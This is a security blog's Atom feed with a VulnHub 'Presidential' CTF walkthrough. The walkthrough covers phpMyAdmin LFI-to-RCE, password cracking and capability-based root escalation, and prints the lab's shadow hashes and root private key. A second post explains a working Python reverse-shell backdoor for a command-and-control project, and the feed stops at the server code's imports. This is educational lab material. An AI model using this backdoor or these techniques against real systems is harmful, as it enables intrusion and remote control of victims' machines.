<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-15T17:07:08+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Arc4he.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><entry><title type="html">Presidential - VulnHub</title><link href="http://localhost:4000/vulnhub-Presidential/" rel="alternate" type="text/html" title="Presidential - VulnHub" /><published>2024-08-14T00:00:00+02:00</published><updated>2024-08-14T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub-Presidential</id><content type="html" xml:base="http://localhost:4000/vulnhub-Presidential/"><![CDATA[<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/web_interface.png" alt="" /></p>

<p>The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.</p>

<p>The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.</p>

<h1 id="hack-the-machine">Hack the Machine</h1>

<h2 id="portscan">PortScan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Wed Aug 14 15:55:11 2024 as: nmap -sCV -p80,2082 -oN target 192.168.1.20
Nmap scan report for 192.168.1.20
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &amp;raquo; Vote Now!
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:3D:48:E9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 14 15:55:18 2024 -- 1 IP address (1 host up) scanned in 6.88 seconds
</code></pre></div></div>

<h2 id="website">WebSite</h2>

<p><img src="assets/images/2024-08-14-vulnhub-Presidential/web_interface.png" alt="" /></p>

<p>At this point we start scanning the entire website extensively, applying fuzzing to find directories and subdomains.</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/email-votenow.png" alt="" /></p>

<p>Scanning the web we see that there is an e-mail contact@votenow.local, at this point we are interested in adding this domain to our <strong>/etc/hosts</strong> to see if the web changes. =&gt; 192.168.1.20 votenow.local</p>

<h2 id="subdomains-scanning">SubDomains Scanning</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt 20 --append-domain | grep -v "400"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: datasafe.votenow.local Status: 200 [Size: 9499]
Progress: 116441 / 141709 (82.17%)^C
</code></pre></div></div>
<p>And we found a important subdomain, at this point we need to edit <strong>/etc/hosts</strong> =&gt; 192.168.1.20 datasafe.votenow.local. This domain <strong>phpmyadmin</strong> is running.</p>

<h2 id="directory-listing">Directory Listing</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://192.168.1.20/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,php.back,bak,back,txt,html,tar,gz -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.20/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.bak,txt,php,bak,back,html,tar,gz,php.back
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/index.html           (Status: 200) [Size: 11713]
/about.html           (Status: 200) [Size: 20194]
/assets               (Status: 301) [Size: 235] [--&gt; http://192.168.1.20/assets/]
/config.php.bak       (Status: 200) [Size: 107]
/config.php           (Status: 200) [Size: 0]
Progress: 26234 / 2205610 (1.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 33874 / 2205610 (1.54%)
</code></pre></div></div>
<p>After some time fuzzing we finally found something. Let’s turn our attention to <strong>config.php.bak</strong> and find credentials:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$dbUser</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>
<span class="nv">$dbPass</span> <span class="o">=</span> <span class="s2">"casoj3FFASPsbyoRP"</span><span class="p">;</span>
<span class="nv">$dbHost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>At this point we try these credentials in <strong>phpmyadmin</strong>. And we are in:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/phpmyadmin_interface.png" alt="" />)</p>

<h2 id="scanning-phpmyadmin">Scanning PhpMyAdmin</h2>

<p>In <strong>votebox</strong> data base we can see <strong>users</strong> table and found <strong>admin</strong> user and his password but that password encrypted whit bcrypt. In this point we can crack the password whit John The Ripper:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre></div></div>
<p>This process will take a while, but when it is finished you will find the password:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$2a$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i:Stella
</code></pre></div></div>

<p>After some time performing an exhaustive scan, we see that the phpmyadmin version is ^<strong>4.8.1</strong>. Using searchsploit we can find vulnerabilities:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit phpmyadmin 4.8.1
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                           | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                           | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                        | php/webapps/50457.py
</code></pre></div></div>

<p>We will focus our attention on the <strong>Remote Code Execution (RCE)</strong>. In this case we will not use the exploit to automate everything but we will do manually:</p>

<p>We have to put our session cookie:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_r3i75sdop9i2tgngpd2al9be1rs6mo36
</code></pre></div></div>
<p>Now we can see a lot of information in the phpmyadmin interface:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/information_db.png" alt="" /></p>

<p>What we have to do now is a test using the sql, in order to derive the LFI to a RCE:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/query_test.png" alt="" /></p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/hello_test.png" alt="" /></p>

<p>At this point as we are in a php resource if we now put malicious code php will interpret it:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/revershell.png" alt="" /></p>

<p>Before reloading the page, we must listen on port 443:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
</code></pre></div></div>

<p>And at this point we have already gained access to the machine:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/hacked.png" alt="" /></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<h2 id="tty-tratament">Tty tratament</h2>
<p>The shell we have now is a bit limited, so we are going to perform a TTY (terminal type) treatment:</p>

<p>You have to put <strong>reset xterm</strong> in the screenshot you can not see it:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/stty-tratament-1.png" alt="" /></p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/ajustando-tty-2.png" alt="" /></p>

<p>at this point we are going to take advantage of the <strong>admin</strong> user credentials that we have obtained by cracking it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ su admin
Password: 
[admin@votenow phpmyadmin]$ 
</code></pre></div></div>

<h2 id="scanning-the-inside-of-the-machine">Scanning the inside of the machine</h2>

<p>At this point we are already inside the machine. Then we have to perform an exhaustive scan of the machine’s interior to find vulnerabilities and to be able to escalate our privilege. After some time scanning the machine, we found the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow phpmyadmin]$ getcap -r / 2&gt; /dev/null 
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
[admin@votenow phpmyadmin]$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/tarS = cap_dac_read_search+ep
</code></pre></div></div>

<p>The <strong>CAP_DAC_READ_SEARCH+ep</strong> capability allows a process to ignore discretionary access restrictions when reading files and accessing directories. Knowing this what we can try is to make a compressed directory of /etc/shadow to test if it works:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow shm]$ tarS -cvf shadow.tar /etc/shadow
tarS: Removing leading `/' from member names
/etc/shadow
[admin@votenow shm]$ ls
shadow.tar
[admin@votenow shm]$ tar -xf shadow.tar 
[admin@votenow shm]$ cd etc/       
[admin@votenow etc]$ cat shadow 
cat: shadow: Permission denied
[admin@votenow etc]$ chmod 770 shadow 
[admin@votenow etc]$ cat shadow 
root:$6$BvtXLMHn$zoYCSCRbdnaUOb4u3su6of9DDUXeUEe05OOiPIQ5AWo6AB3FWRr/RC3PQ4z.ryqn6o5xS9g4JTKHYI4ek9y541:18440:0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
systemd-network:!!:18440::::::
dbus:!!:18440::::::
polkitd:!!:18440::::::
sshd:!!:18440::::::
postfix:!!:18440::::::
chrony:!!:18440::::::
apache:!!:18440::::::
admin:$6$QeT4IOER$tHg/DAvc5NegomFKFryL5Xe7Od05z7CkYYs9sdRQaQVnJYvsXm2tQljaUhgXVMG8jXaChhhmny6MhD2K5jFXF/:18440:0:99999:7:::
mysql:!!:18440::::::
[admin@votenow etc]$ 
</code></pre></div></div>
<p>And it worked! Now what we are going to do in order to gain access as user root, is the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow etc]$ tarS -cvf ssh.tar /root/.ssh/id_rsa
tarS: Removing leading `/' from member names
/root/.ssh/id_rsa
[admin@votenow etc]$ tarS -xf ssh.tar 
[admin@votenow etc]$ cd root/.ssh/
[admin@votenow .ssh]$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
[admin@votenow .ssh]$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
Last login: Wed Aug 14 17:39:34 2024 from 127.0.0.1
[root@votenow ~]# whoami
root
[root@votenow ~]# cat 
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.
[root@votenow ~]# 
</code></pre></div></div>

<p>Finally we have finished compromising the machine.</p>

<p>Arc4he</p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="vulnhub" /><category term="infosec" /><category term="hashcat" /><category term="phpmyadmin" /><category term="ssh" /><category term="mysql" /><category term="capabilities" /><summary type="html"><![CDATA[The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes. The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.]]></summary></entry><entry><title type="html">Command And Control</title><link href="http://localhost:4000/CommandAndControl/" rel="alternate" type="text/html" title="Command And Control" /><published>2024-08-12T00:00:00+02:00</published><updated>2024-08-12T00:00:00+02:00</updated><id>http://localhost:4000/CommandAndControl</id><content type="html" xml:base="http://localhost:4000/CommandAndControl/"><![CDATA[<p><img src="/assets/images/Command-And-Control/command-Control-1.png" alt="" /></p>

<h2 id="definition-and-objective">Definition and Objective</h2>

<p>A <strong>Command and Control (C&amp;C)</strong> is a software system designed to control a client from a server. It allows an operator to execute malware or other commands on remote machines. This document explains the basic implementation of a simple C&amp;C project.</p>

<h3 id="simple-cc-project">Simple C&amp;C Project</h3>

<p><strong>GitHub Link</strong>: <a href="https://github.com/Arc4he/Command-And-Control/">Simple C&amp;C Project</a></p>

<h3 id="simple-backdoor">Simple Backdoor</h3>

<p>In the GitHub project, there is a file called <code class="language-plaintext highlighter-rouge">backdoor.py</code> with the following code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">subprocess</span>   

<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Error executing command: </span><span class="si">{</span><span class="n">e</span><span class="p">.</span><span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Unexpected error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">client_socket</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.1.X"</span><span class="p">,</span> <span class="mi">443</span><span class="p">))</span> <span class="c1"># Your IP
</span>            
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">command</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">command</span><span class="p">:</span>
                    <span class="k">break</span>
                
                <span class="n">command_output</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ConnectionRefusedError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div></div>

<h2 id="initial-program-flow">Initial Program Flow</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">client_socket</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.1.X"</span><span class="p">,</span> <span class="mi">443</span><span class="p">))</span> <span class="c1"># Your IP
</span>            
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">command</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">command</span><span class="p">:</span>
                    <span class="k">break</span>
                
                <span class="n">command_output</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ConnectionRefusedError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div></div>

<p>In this code snippet we start the main flow of the program, and try to create a socket to connect to the server. Now we create a while loop to receive commands from the server constantly. When command is received, run_command function is called to execute and reeturn it. Finally we have exceptions in case there is a problem with the program, so that we can control the errors.</p>

<h2 id="function-run-command">Function Run command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Error executing command: </span><span class="si">{</span><span class="n">e</span><span class="p">.</span><span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Unexpected error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
</code></pre></div></div>

<p>The main purpose of the function is to execute the commands received from the server. To do this, I import the subprocess library to execute commands at the system level and return them to the server.</p>

<h2 id="cc">C&amp;C</h2>
<p>In the github project I have a file called <strong>command_and_control.py</strong> whit this code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">tempfile</span>
<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
